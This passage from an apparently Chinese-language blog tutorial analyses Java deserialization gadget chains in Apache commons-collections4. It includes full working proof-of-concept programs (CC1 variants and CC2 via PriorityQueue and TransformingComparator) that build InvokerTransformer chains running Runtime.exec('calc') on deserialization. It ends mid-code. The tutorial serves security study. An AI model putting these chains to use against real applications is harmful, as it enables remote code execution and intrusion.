pocs</h3><ol><li><p>⽼的利⽤链在commons-collections4中只需要少量修改就可以使用(CC1,CC3,CC6)</p><ol><li><strong>但是内部逻辑其实有了较多的不同了</strong>: TransformedMap和LazyMap<ol><li>CC1For4_TransformedMap</li><li>CC1For4_LazyMap</li></ol></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CC1For4_TransformedMap</span></span><br><span class="line"><span class="keyword">package</span> CC2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1For4_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 解决的方式是添加了一个ConstantTransformer</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc&quot;</span> &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.transformedMap(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">            <span class="comment">// 这个地方也会导致执行命令</span></span><br><span class="line">            <span class="comment">// 进入后发现有直接进行一次transformMap()对所有元素进行转换</span></span><br><span class="line">            <span class="comment">// 与原始CC库的TransformedMap的逻辑是不一样的来着</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span>  <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="Q-CC1For4-TransformedMap-poc现在会调用两次calc"><a href="#Q-CC1For4-TransformedMap-poc现在会调用两次calc" class="headerlink" title="Q: CC1For4_TransformedMap poc现在会调用两次calc?"></a>Q: CC1For4_TransformedMap poc现在会调用两次calc?</h3><ol><li><p>失去了decorate方法，主要区别在于下面</p><ol><li>变化后: <code>Map outerMap = TransformedMap.transformedMap(innerMap, null, transformerChain);</code></li><li>变化前: <code>Map outerMap = TransformedMap.decorate(innerMap, null, payload);</code></li></ol></li><li><p>进入到新的<code>transformedMap</code>中</p><ol><li>发现会返回经过transformed的数组</li><li>在transformedMap()函数中最终调用了键值转换器</li><li><strong>相比之下</strong>: 原来的<code>decorate()</code>方法仅仅对键值转换器进行赋值，并没有进行转换 –&gt; 所以这里在创建TransformedMap时就会调用一次转换触发我们恶意命令</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;K, V&gt; TransformedMap&lt;K, V&gt; <span class="title function_">transformedMap</span><span class="params">(Map&lt;K, V&gt; map, Transformer&lt;? <span class="built_in">super</span> K, ? extends K&gt; keyTransformer, Transformer&lt;? <span class="built_in">super</span> V, ? extends V&gt; valueTransformer)</span> &#123;</span><br><span class="line">    TransformedMap&lt;K, V&gt; decorated = <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    <span class="keyword">if</span> (map.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        Map&lt;K, V&gt; transformed = decorated.transformMap(map);</span><br><span class="line">        decorated.clear();</span><br><span class="line">        decorated.decorated().putAll(transformed);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorated;</span><br><span class="line">&#125;        </span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Map&lt;K, V&gt; <span class="title function_">transformMap</span><span class="params">(Map&lt;? extends K, ? extends V&gt; map)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (map.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Map&lt;K, V&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedMap</span>(map.size());</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">i$</span> <span class="operator">=</span> map.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(i$.hasNext()) &#123;</span><br><span class="line">            Map.Entry&lt;? <span class="keyword">extends</span> <span class="title class_">K</span>, ? <span class="keyword">extends</span> <span class="title class_">V</span>&gt; entry = (Map.Entry)i$.next();</span><br><span class="line">            result.put(<span class="built_in">this</span>.transformKey(entry.getKey()), <span class="built_in">this</span>.transformValue(entry.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="CC2-for-commons-collections4"><a href="#CC2-for-commons-collections4" class="headerlink" title="CC2 for commons-collections4"></a>CC2 for commons-collections4</h2><h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><blockquote><p>CC2是一条专门用来应用于CC库4.0版本的新链子</p></blockquote><ol><li><p>思路是通过java.util.PriorityQueue的<code>readObject()</code>方法调用内部的heapify()方法来实现比较，而比较使用比较转换器<code>TransformingComparator</code>，可以在比较是对不同值进行转换，调用恶意代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget Chain 挺简单的一条链</span></span><br><span class="line">java.util.PriorityQueue#readObejct()</span><br><span class="line">    java.util.PriorityQueue#heapify()</span><br><span class="line">        java.util.PriorityQueue#siftDown()</span><br><span class="line">            java.util.PriorityQueue#siftDownUsingComparator()</span><br><span class="line">                org.apache.commons.collections4.comparators.TransformingComparator#Compare()</span><br><span class="line">                    Transformer#transform()             </span><br></pre></td></tr></table></figure></li></ol><h3 id="java-util-PriorityQueue"><a href="#java-util-PriorityQueue" class="headerlink" title="java.util.PriorityQueue"></a>java.util.PriorityQueue</h3><blockquote><p>PriorityQueue的利⽤链不⽀持在commons-collections4 4.0前使用:  org.apache.commons.collections4.comparators.TransformingComparator ，在commons-collections4.0以前是版本中是没有实现 Serializable 接⼝的，⽆法在序列化中使⽤</p></blockquote><ol><li>java.util.PriorityQueue 是⼀个有⾃⼰ readObject() ⽅法的类，这里是java的原生库来着<ol><li>readObject中调用了heapify()</li><li>进入后到最后有调用compare()</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="org-apache-commons-collections4-comparators-TransformingComparator"><a href="#org-apache-commons-collections4-comparators-TransformingComparator" class="headerlink" title="org.apache.commons.collections4.comparators.TransformingComparator"></a>org.apache.commons.collections4.comparators.TransformingComparator</h3><ol><li><p>org.apache.commons.collections4.comparators.TransformingComparator中 compare() 有调<br>⽤ transform() ⽅法的函数，并且实现了Comparator接口</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparator</span>&lt;I, O&gt; <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;I&gt;, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="CC2-原始poc"><a href="#CC2-原始poc" class="headerlink" title="CC2 原始poc"></a>CC2 原始poc</h3><ol><li>现在来构建poc，总体调用链有了，主要还是条件问题</li><li>条件<ol><li><p><strong>首先是序列化问题</strong>：TransformingComparator和PriorityQueue都可以序列化，稳了Bro</p></li><li><p>java.util.PriorityQueue本身构造函数可以指定comparator</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                 Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">     <span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">     <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">     <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">     <span class="built_in">this</span>.queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">     <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>要触发heapify()中的siftDown()需要至少有2个元素<code>for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)&#123;siftDown(i, (E) queue[i]);&#125;</code></p></li><li><p>要触发siftDownUsingComparator()中的compare方法需要使得与子项进行比较(数据机构的内容)，可以构造，这里的调用与值无关，与调用有关而已，直接填入简单的1，2看看</p></li><li><p>构造比较器的逻辑也比较简单</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc from p牛</span></span><br><span class="line"><span class="keyword">package</span> CC2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* * * * * * 1. 构造payload * * * * * */</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)  <span class="comment">// 加上常量可以进行比较，否则会报错出来</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="comment">// 这里多了一步Comparator的构造</span></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* * * * * * 2. 构造triggerObj * * * * * */</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// 不是最大堆，明显会发生一次比较和交换，这里直接按照逻辑不用一步一步分析代码了(严谨总是好的)</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* * * * * * 3. 正式插入payload * * * * * */</span></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CC2-TemplatesImpl-改进poc"><a href="#CC2-TemplatesImpl-改进poc" class="headerlink" title="CC2_TemplatesImpl 改进poc"></a>CC2_TemplatesImpl 改进poc</h3><ol><li>目的也是改进出⽆Transformer数组的利⽤链</li><li><strong>注意点分析</strong><ol><li><p><strong>Q: add(obj)后add(1)为什么不行</strong>: 合理如果改成add(obj)后add(1)应该也是可以的，但是这里不行，总是先调用到transform(1)这是就报错了，调用到transform(obj)的话总是在后</p><ol><li>A: 这里PriorityQueue会对每一次add都调用到比较去到<code>transform()</code>，但是由于这里的fakeTransformer导致调用了<code>toString()</code>，排列后总是1在第一个，如果一定要这样做可以学习ysoserial的做法(但是建议两个obj完事)</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ysoserial solution</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 手动进行设置即可</span></span><br></pre></td></tr></table></figure></li><li><p><strong>InvokerTransformer</strong>: 这条链由于失去了外面的<code>TrAXFilter</code>的包裹，导致需要调用到<code>InvokerTransformer</code>来执行命令，对于有过滤的还是不行</p></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 